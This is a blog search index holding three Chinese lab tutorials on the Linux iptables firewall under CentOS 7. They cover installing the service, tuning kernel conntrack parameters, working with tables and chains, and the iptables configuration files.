<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Iptables的安装与内核配置</title>
    <url>/2024/10/19/1-1.Iptables%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%86%85%E6%A0%B8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>了解iptables防火墙的基础知识，利用yum对防火墙iptables进行了安装，在配置文件进行内核优化配置。</p>
<h2 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h2><p>iptables防火墙，iptables配置，iptables安装。</p>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><h3 id="1-防火墙的分类"><a href="#1-防火墙的分类" class="headerlink" title="1.防火墙的分类"></a>1.防火墙的分类</h3><p>（1）从防火墙作用范围讲，防火墙可以大体分为主机防火墙和网络防火墙。<br>主机防火墙：作用于单个计算机系统，例如个人电脑上windows自带的防火墙，linux系统上的iptables。<br>网络防火墙：往往处于网络入口或边缘，对企业网络入口进行防护，服务范围为整个企业的内部网络。中小企业可以使用一台x86服务器运用linux的iptables搭建功能强大的网络防火墙。<br>网络防火墙和主机防火墙在企业网络架构中所处的网络位置不一样，它俩的结合能使企业网络更安全。<br>（2）从产品形态讲，防火墙可以分为硬件防火墙和软件防火墙。<br>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。<br>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。<br>（3）按照功能分为：包过滤型、状态检测型和代理型。<br>包过滤防火墙是用一个软件查看所流经的数据包的包头（header），由此决定整个包的命运。它可能会决定丢弃（DROP）这个包，可能会接受（ACCEPT）这个包（让这个包通过），也可能执行其它更复杂的动作。<br>状态检测防火墙采用了状态检测包过滤的技术，是传统包过滤上的功能扩展。<br>代理防火墙通过一种代理（Proxy）技术参与到一个TCP连接的全过程。</p>
<h3 id="2-iptables介绍"><a href="#2-iptables介绍" class="headerlink" title="2.iptables介绍"></a>2.iptables介绍</h3><p>（1）iptables防火墙属于包过滤型，工作在网络层，针对IP数据包，体现在对包内的IP地址和端口等信息的处理上（源IP、端口和目标IP、端口）。<br>（2）iptables防火墙由netfilter和iptables组成。iptables其实并不是真正的防火墙，我们可以理解它为一个命令行工具，位于用户空间，我们用这个工具操作“安全框架”。netfilter是防火墙真正的安全框架（framework），netfilter位于内核空间。<br>（3）Netfilter是Linux操作系统内核的一个数据包处理模块，主要有如下功能：网络地址转换(NAT)；数据包内容修改；包过滤防火墙。</p>
<h3 id="3-iptables结构"><a href="#3-iptables结构" class="headerlink" title="3.iptables结构"></a>3.iptables结构</h3><p>（1）iptables由4张表、5条链和用户在链内写入的各种规则所组成。</p>
<p>（2）表：容纳各种规则链；表是按照功能分的类，具体功能如下：<br>raw表：用来决定是否对数据包进行状态跟踪。（不常用）<br>mangle表：为数据包设置标记，有ACK、SYN、FIN、RST、PSH、URG等标记。（不常用）<br>nat表：修改数据包的IP地址、端口等信息。（网关型防火墙常用）<br>filter表：确定是否放行数据包。（常用）</p>
<p>（3）链：容纳各种防火墙规则；链是按照时机分的类。<br>input：处理入站请求包。<br>output：处理出站包（就是响应、应答包）。<br>forward：处理转发数据包，实现不同网段间的通信。<br>prerouting：在包做路由选择之前应用此链的规则。<br>postrouting：在数据包做路由选择之后应用此链的规则。</p>
<p>（4）iptables规则介绍<br>规则：规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。<br>当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行(accept)，拒绝(reject)和丢弃(drop)等。配置防火墙的主要工作是添加，修改和删除等规则。</p>
<p>（5）下面是规则中会经常用到的规则管理和处理动作介绍：<br>iptables命令的管理控制选项<br>-A在指定链的末尾添加（append）一条新的规则。<br>-D删除（delete）指定链中的某一条规则，可以按规则序号和内容删除。<br>-I在指定链中插入（insert）一条新的规则，默认在第一行添加。<br>-R修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换。<br>-L列出（list）指定链中所有的规则进行查看（默认是filter表，如果列出nat表的规则需要添加-t，即iptables -t nat -L）<br>-E重命名用户定义的链，不改变链本身。<br>-F清空（flush）。<br>-N新建（new-chain）一条用户自己定义的规则链。<br>-X删除指定表中用户自定义的规则链（delete-chain）。<br>-P设置指定链的默认策略（policy）。<br>-Z将所有表的所有链的字节和数据包计数器清零。<br>-n使用数字形式（numeric）显示输出结果。<br>-v查看规则表详细信息（verbose）的信息。<br>-V查看版本(version)。<br>-h获取帮助（help）。<br>-x：显示精确值。<br>–line-numbers：显示链上的规则的编号。<br>-nv：常用组合：但L要写在后面。</p>
<p>（6）iptables规则常用到的处理动作：<br>匹配（match）：符合指定的条件，比如指定的IP地址和端口。<br>丢弃（drop）：当一个包到达时，简单地丢弃，不做其它任何处理。<br>接受（accept）：和丢弃相反，接受这个包，让这个包通过。<br>拒绝（reject）：和丢弃相似，但它还会向发送这个包的源主机发送错误消息。这个错误消息可以指定，也可以自动产生。<br>目标（target）：指定的动作，说明如何处理一个包，比如：丢弃，接受或拒绝。<br>跳转（jump）：和目标类似，不过它指定的不是一个具体的动作，而是另一个链，表示要跳转到那个链上。</p>
<h3 id="4-iptables的基本语法格式"><a href="#4-iptables的基本语法格式" class="headerlink" title="4.iptables的基本语法格式"></a>4.iptables的基本语法格式</h3><p>Centos7下可用firewalld和iptables两种防火墙管理方式，实验中主要使用iptables来进行操作。下面对iptables的使用语法进行介绍。<br>基本语法格式：<br>iptables  ［-t  表名］  命令选项 ［链名］ ［条件匹配］ ［-j  目标动作或跳转］<br>iptables  -t  表名  &lt;-A&#x2F;I&#x2F;D&#x2F;R&gt;  规则链名  ［规则号］  &lt;-i&#x2F;o  网卡名&gt;  -p  协议名  &lt;-s  源IP&#x2F;源子网&gt;  –sport源端口  &lt;-d  目标IP&#x2F;目标子网&gt;  –dport  目标端口  -j  动作<br>表名、链名：用于指定iptables命令所操作的表和链；<br>命令选项：用于指定管理iptables规则的方式（比如：插入、增加、删除、查看等）；<br>条件匹配：用于指定对符合什么条件的数据包进行处理（比如：丢弃、接受、拒绝等）；<br>目标动作或跳转：用于指定数据包的处理方式（比如允许通过、拒绝、丢弃、跳转（Jump）给其它链处理等）。</p>
<h2 id="【软件工具】"><a href="#【软件工具】" class="headerlink" title="【软件工具】"></a>【软件工具】</h2><ul>
<li>操作系统：Centos7</li>
<li>其他：Iptables</li>
</ul>
<h2 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h2><p>1.掌握iptables防火墙的安装<br>2.掌握iptables内核优化配置</p>
<h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><h3 id="1-安装iptables"><a href="#1-安装iptables" class="headerlink" title="1.安装iptables"></a>1.安装iptables</h3><p>CentOS7.x中如果不需要使用iptables防火墙，可以清空策略条目或者停止iptables服务，但是我们停止iptables服务时会提示没有服务，因为CentOS从7开始默认用的是firewalld，firewalld基于iptables，虽然有iptables的核心，但是iptables的服务（iptables-services）是没安装的，如果要使用iptables服务需要安装。所以只要停止firewalld服务即可。</p>
<p>登录centos服务器，查看是否有iptables的service服务。使用命令systemctl  status  iptables查看iptables服务状态，提示没有此服务。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061738607.png"
                      alt="image.png"
                ><br>安装过程，这里使用yum本地源进行安装，yum已经配置好，cd  &#x2F;etc&#x2F;yum.repos.d&#x2F;进入文件下，使用命令vi  Local.repo查看配置文件，可以得知安装包目录在&#x2F;mnt&#x2F;yum-rpm&#x2F;下。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061738525.png"
                      alt="image.png"
                ><br>进入安装包目录下，查看安装包，已经放置安装包。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061739815.png"
                      alt="image.png"
                ><br>执行命令yum  -y  install  iptables*，安装iptables。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061739536.png"
                      alt="image.png"
                ><br>cd~ 回到主目录。再次查看iptables状态，状态为disabled，说明已经安装成功。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061741260.png"
                      alt="image.png"
                ><br>执行命令systemctl  enable  iptables 设置开机启用iptables服务。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061742562.png"
                      alt="image.png"
                ><br>使用systemctl  start  iptables 启动iptables后再次查看iptables状态。<br>使用systemctl  status  iptables 查看iptables状态，防火墙启动成功。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061743277.png"
                      alt="image.png"
                ><br>查看iptables比较常用的参数，可以执行命令man  iptables来查看。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061744589.png"
                      alt="image.png"
                ></p>
<h3 id="2-iptables内核优化配置"><a href="#2-iptables内核优化配置" class="headerlink" title="2.iptables内核优化配置"></a>2.iptables内核优化配置</h3><p>平常我们对iptables的优化，一般考虑的思路是：当服务器收到一条请求时，它会把iptables从上往下，一条条匹配定制的规则。那么假如机器收到一个正常的web请求，要访问80端口，它需要先去检验前面规则，发现都不符合，直到满足条件才能访问到80端口。这样的步骤会使防火墙的工作效率降低很多。所以我们优化的思路是：请求最频繁的放在最上面，请求频率较小的放在最后面。可以直接去修改文件：vi  &#x2F;etc&#x2F;sysconfig&#x2F;iptables。<br>未对系统进行内核优化时，原始的内核参数文件&#x2F;etc&#x2F;sysctl.conf没有配置信息。可以使用命令vi  &#x2F;etc&#x2F;sysctl.conf进行ipv4内核优化，在参数文件添加以下信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061746236.png"
                      alt="image.png"
                ><br>net.ipv4.ip_forward&#x3D;1 启用路由转发功能<br>net.ipv4.conf.default.rp_filter&#x3D;0 关闭源路由核查功能<br>恶意用户可以使用IP重定向来修改远程主机中的路由表，在设计良好的网络中，末端的重定向设置是不需要的，发送和接受重定向信息包都要关闭。<br>net.ipv4.conf.all.accept_redirects&#x3D;0<br>net.ipv4.conf.all.send_redirects&#x3D;0<br>为了配置生效，在终端输入命令sysctl  -p即可，列出生效配置选项。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061751193.png"
                      alt="image.png"
                ><br>若想对iptables进行内核优化，可以用vi命令编辑内核参数文件&#x2F;etc&#x2F;sysctl.conf添加一些配置，来进行iptables内核优化。以下参数是对centos7.x的iptables防火墙的优化，防火墙不开会有提示，可以忽略不理。如果是centos5.X需要把netfilter.nf_conntrack替换成ipv4.netfilter.ip。<br>定义允许的最大跟踪连接条目，是在内核内存中netfilter可以同时处理的“任务”（连接跟踪条目）：<br>net.nf_conntrack_max&#x3D;25000000<br>net.netfilter.nf_conntrack_max&#x3D;25000000<br>缩短established的超时时间为180秒：<br>net.netfilter.nf_conntrack_tcp_timeout_established&#x3D;180<br>设置time_wait的超时时间为120秒：<br>net.netfilter.nf_conntrack_tcp_timeout_time_wait&#x3D;120<br>设置close_wait的超时时间是60秒：<br>net.netfilter.nf_conntrack_tcp_timeout_close_wait&#x3D;60<br>设置fin_wait的超时时间为120秒：<br>net.netfilter.nf_conntrack_tcp_timeout_fin_wait&#x3D;120<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061752395.png"
                      alt="image.png"
                ><br>上面设置超时时间的是TCP端口的几个状态：<br>（1）ESTABLISHED<br>ESTABLISHED的意思是建立连接。表示两台机器正在通信。<br>（2）TIMEWAIT<br>我方主动调用close()断开连接，收到对方确认后状态变为TIMEWAIT。TCP协议规定TIMEWAIT状态会一直持续2MSL(即两倍的分段最大生存期)，以此来确保旧的连接状态不会对新连接产生影响。处于TIMEWAIT状态的连接占用的资源不会被内核释放，所以作为服务器，在可能的情况下，尽量不要主动断开连接，以减少TIME_WAIT状态造成的资源浪费。<br>（3）CLOSEWAIT<br>对方主动关闭连接或者网络异常导致连接中断，这时我方的状态会变成CLOSEWAIT此时我方要调用close()来使得连接正确关闭<br>（4）FIN-WAIT（有两种FIN-WAIT1和FIN-WAIT2）<br>等待远程TCP连接中断请求，或先前的连接中断请求的确认，主动关闭端应用程序调用close，TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态。<br>从远程TCP等待连接中断请求，主动关闭端接到ACK后，就进入了FIN-WAIT-2。这是在关闭连接时，客户端和服务器两次握手之后的状态，是著名的半关闭的状态了，在这个状态下，应用程序还有接受数据的能力，但是已经无法发送数据，但是也有一种可能是，客户端一直处于FIN-WAIT-2状态，而服务器则一直处于WAIT_CLOSE状态，而直到应用层来决定关闭这个状态。<br>下面用图简单表示一下TCP正常连接和终止的状态。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061756448.png"
                      alt="image.png"
                ></p>
<p>打开终端，输入命令tail  &#x2F;etc&#x2F;sysctl.conf查看文件编辑内容。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061757726.png"
                      alt="image.png"
                ><br>在终端输入命令sysctl  -p使修改生效。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061758659.png"
                      alt="image.png"
                ></p>
<p>[[1-2.iptables表和链的介绍与基础操作]]</p>
]]></content>
  </entry>
  <entry>
    <title>iptables表和链的介绍与基础操作</title>
    <url>/2024/10/19/1-2.iptables%E8%A1%A8%E5%92%8C%E9%93%BE%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>了解Iptables中的表和链的原理，掌握对Iptables表和链的增删改查等操作，对Iptables配置规则进行详细查看。</p>
<h2 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h2><p>iptables表，iptables链。</p>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>iptables采用“表”和“链”的分层结构，在Linux中是四表五链结构，表链的存在在iptables中有重要的意义，通过对表链进行规则的策略配置，可以对系统的防火墙进行很好的安全维护。具体的四表五链的对应关系以下图形式列出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061937748.png"
                      alt="image.png"
                ></p>
<h3 id="表的组成与功能介绍："><a href="#表的组成与功能介绍：" class="headerlink" title="表的组成与功能介绍："></a>表的组成与功能介绍：</h3><p>1.filter表—3条链：INPUT、FORWARD、OUTPUT。<br>作用：过滤数据包。内核模块：iptablesfilter。<br>2.Nat表—3条链：PREROUTING、POSTROUTING、OUTPUT（centos7中还会有INPUT链）<br>作用：用于网络地址转换（IP、端口）。内核模块：iptablenat。<br>3.Mangle表—4条链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD<br>作用：修改数据包的服务类型、TTL、并且可以配置路由实现QOS内核模块：iptablemangle(别看这个表这么麻烦，设置策略时几乎都不会用到它)<br>4.Raw表—2条链：OUTPUT、PREROUTING<br>作用：决定数据包是否被状态跟踪机制处理。内核模块：iptableraw。</p>
<h3 id="链的功能介绍："><a href="#链的功能介绍：" class="headerlink" title="链的功能介绍："></a>链的功能介绍：</h3><p>1.INPUT—进来的数据包应用此规则链中的策略<br>2.OUTPUT—外出的数据包应用此规则链中的策略<br>3.FORWARD—转发数据包时应用此规则链中的策略<br>4.PREROUTING—对数据包作路由选择前应用此链中的规则（所有的数据包进来的时侯都先由这个链处理）<br>5.POSTROUTING—对数据包作路由选择后应用此链中的规则（所有的数据包出来的时侯都先由这个链处理）<br>同一链在不同表中的执行优先级次序（由高而低）：raw→mangle→nat→filter</p>
<h2 id="【软件工具】"><a href="#【软件工具】" class="headerlink" title="【软件工具】"></a>【软件工具】</h2><ul>
<li>操作系统：Centos7</li>
<li>其他：Iptables</li>
</ul>
<h2 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h2><ul>
<li>掌握Iptables表链结构</li>
<li>掌握Iptables查看表链命令</li>
<li>掌握Iptables表链增删改查等操作命令</li>
<li>掌握Iptabels规则查看命令</li>
</ul>
<h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><h3 id="一、iptables表链查看"><a href="#一、iptables表链查看" class="headerlink" title="一、iptables表链查看"></a>一、iptables表链查看</h3><p>对表中的链进行查看，用到的主要命令是：iptables  -t  表名  -L，使用-t指定规则表。<br>查看filter表中的内容：iptables  -t  filter  -L。可以看到filter表中有3条链INPUT、FORWARD和OUTPUT，与上面图中的介绍相对应。可以看到此表中还有默认策略存在。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061940340.png"
                      alt="image.png"
                ></p>
<p>如果要查看表中某条链的规则策略，使用命令：iptables  -t  表名  -L  链名。查看filter表中INPUT链的策略：<br>iptables  -t  filter  -L  INPUT。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061941004.png"
                      alt="image.png"
                ></p>
<p>查看nat表中的内容。可以看到nat表中有4条链PREROUTING、POSTROUTING、OUTPUT和INPUT，与前文的介绍相对应。如果要查看某条链，同样在后面添加链即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061942494.png"
                      alt="image.png"
                ></p>
<p>查看mangle表的内容，表中有5条链PREROUTING、POSTROUTING、INPUT、OUTPUT和FORWARD，与前文的介绍相对应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061943202.png"
                      alt="image.png"
                ></p>
<p>查看raw表的内容，表中有2条链OUTPUT和PREROUTING，与前文中的介绍相对应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061944746.png"
                      alt="image.png"
                ></p>
<h3 id="二、iptables传输数据包的过程"><a href="#二、iptables传输数据包的过程" class="headerlink" title="二、iptables传输数据包的过程"></a>二、iptables传输数据包的过程</h3><p>数据包经过iptables的基本流程。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061944763.png"
                      alt="image.png"
                ></p>
<p>当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。<br>如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。<br>如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。</p>
<h3 id="三、iptables表链基础操作"><a href="#三、iptables表链基础操作" class="headerlink" title="三、iptables表链基础操作"></a>三、iptables表链基础操作</h3><p>上面对表链的内容进行了查看，下面主要介绍表链的一些基础操作，例如：增、删、改、默认、记数等简单操作。结合man iptabels对表链进行操作，首先执行命令man iptabes查看iptables表链操作方法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061947929.png"
                      alt="image.png"
                ></p>
<p>增加自定义链：iptables  -t  表名  -N  链名<br>在终端输入命令iptables  -t  nat  -N  test1，可以在表中添加一条名为test1的新链。使用-L列出所有规则：iptables  -t  nat  -L。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061952364.png"
                      alt="image.png"
                ></p>
<p>使用上一步的方法继续在表中增加两条新链test2和test3。<br>iptables  -t  nat  -N  test2  增加新链test2<br>iptables  -t  nat  -N  test3  增加新链test3<br>iptables  -t  nat  -L  查看nat表的内容，增加了两条新链。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061952051.png"
                      alt="image.png"
                ></p>
<p>修改自定义链：iptables  -t   表名  -E  旧链名  新链名。<br>对自定义链进行重命名使用参数-E。使用下面的命令将test2的链名重命名为ceshi2。<br>iptables  -t  nat  -E  test2  ceshi2  将链test2重命名为ceshi2<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061953560.png"
                      alt="image.png"
                ></p>
<p>删除自定义链：iptables  -t  表名  -X  链名<br>若想删除某条自定义的链，使用-X参数。在终端输入命令iptables  -t  nat  -X  test1，删除表nat中自定义的链test1。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061954905.png"
                      alt="image.png"
                ></p>
<p>删除某表所有自定义链：iptables  -t  表名  -X<br>在终端输入命令iptables  -t  nat  -X  可以直接删除表nat中所有自定义的链。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061954773.png"
                      alt="image.png"
                ></p>
<p>修改链的默认策略<br>可以使用-P参数修改某条链的默认规则。例如在终端输入命令iptables  -P  OUTPUT  DROP将表filter中的链OUTPUT的默认规则改为DROP。这里&#x3D;&#x3D;没有指定表，修改的就是默认的filter表&#x3D;&#x3D;。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061956773.png"
                      alt="image.png"
                ></p>
<p>利用–policy也可以对规则进行修改。<br>利用–policy将上面的策略改回默认的ACCEPT，按下面命令进行配置。<br>iptables  –policy  OUTPUT  ACCEPT  将filter表中的OUTPUT链的默认策略改为ACCEPT<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410061957730.png"
                      alt="image.png"
                ></p>
<p>以数字形式显示链中的规则：–line-numbers<br>查看链中的规则，并以数字的形式显示，使用命令：iptables  –line-numbers  -L。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062005024.png"
                      alt="image.png"
                ></p>
<p>规则计数器：-v<br>链中的规则和默认策略经常使用-v选项来观察规则的匹配情况，执行命令-nvL可以查看详细信息。其中pkts是被本机报文匹配的个数，bytes是报文所有大小加起来之和。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062006256.png"
                      alt="image.png"
                ></p>
<p>[[1-3.iptables 的主要命令与扩展参数]]</p>
]]></content>
  </entry>
  <entry>
    <title>Iptables配置文件</title>
    <url>/2024/10/19/1-4.Iptables%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>了解Iptables配置文件的相关内容，通过更改配置文件，了解相关命令。</p>
<h2 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h2><p>iptables配置文件</p>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>iptables服务的配置文件是&#x2F;etc&#x2F;sysconfig&#x2F;iptables-config，可以通过更改配置文件中的内容来更改控制iptables服务的行为。</p>
<h2 id="【软件工具】"><a href="#【软件工具】" class="headerlink" title="【软件工具】"></a>【软件工具】</h2><ul>
<li>操作系统：Centos7</li>
<li>其他：Iptables</li>
</ul>
<h2 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h2><p>了解Iptables防火墙配置文件中各选项的含义并操作验证。</p>
<h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><p>iptables服务的配置文件是&#x2F;etc&#x2F;sysconfig&#x2F;iptables-config，登录系统后使用命令vim查看，并按图中信息进行配置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062202747.png"
                      alt="image.png"
                ></p>
<p>iptables防火墙规则的配置文件：&#x2F;etc&#x2F;sysconfig&#x2F;iptables，用vim命令可以对防火墙规则进行查看，配置文件中显示的是开机自动生效的防火墙规则。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062209251.png"
                      alt="image.png"
                ></p>
<p>首先将还原&#x2F;root&#x2F;chushi.txt文件中的防火墙规则，输入iptables-restore  &lt;&#x2F;root&#x2F;chushi.txt，然后输入iptables  -L  -n  –line-numbers查看规则。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062206992.png"
                      alt="image.png"
                ></p>
<p>输入iptables-save&gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables保存配置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062207245.png"
                      alt="image.png"
                ></p>
<p>输入reboot重启电脑，登录后再次使用cat查看&#x2F;etc&#x2F;sysconfig&#x2F;iptables文件，其中的内容就是开机自动生效的防火墙规则。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062211521.png"
                      alt="image.png"
                ></p>
<p>防火墙开机自启并写入防火墙规则的设定文件：&#x2F;usr&#x2F;libexec&#x2F;iptables&#x2F;iptables.init，用vim也可以查看配置文件的内容。通过执行此文件可以对防火墙服务进行管理，也可以对防火墙规则进行保存查看等，输入文件名可以看到它<br>可以进行的具体操作。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062212558.png"
                      alt="image.png"
                ></p>
<p>下面对服务配置文件的具体内容按顺序进行介绍，编辑配置文件：vim  &#x2F;etc&#x2F;sysconfig&#x2F;iptables-config。<br>IPTABLESMODULES&#x3D;””：是否需要支持其他模块。例如：支持ftp模块并且支持ftp的地址转换，可以添加ip_conntrack_ftp ip_nat_ftp，添加后保存退出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062214294.png"
                      alt="image.png"
                ></p>
<p>当重启防火墙时，上面添加的模块会被加载。执行命令&#x2F;usr&#x2F;libexec&#x2F;iptables&#x2F;iptables.initrestart可以查看到加载信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062215882.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_MODULES_UNLOAD&#x3D;“”：用来定义当iptables服务停止的时候，自定义的模块是否被卸载，yes是卸载。如果配置了yes当停止服务的时候，模块会被卸载，配置yes之后保存退出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062216879.png"
                      alt="image.png"
                ></p>
<p>停止防火墙，发现有卸载信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062217056.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_SAVE_ON_STOP&#x3D;“”：当防火墙停止的时候，配置的防火墙规则是否保存，默认是不保存。如果改为yes，防火墙停止配置的规则会被保存。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062217289.png"
                      alt="image.png"
                ></p>
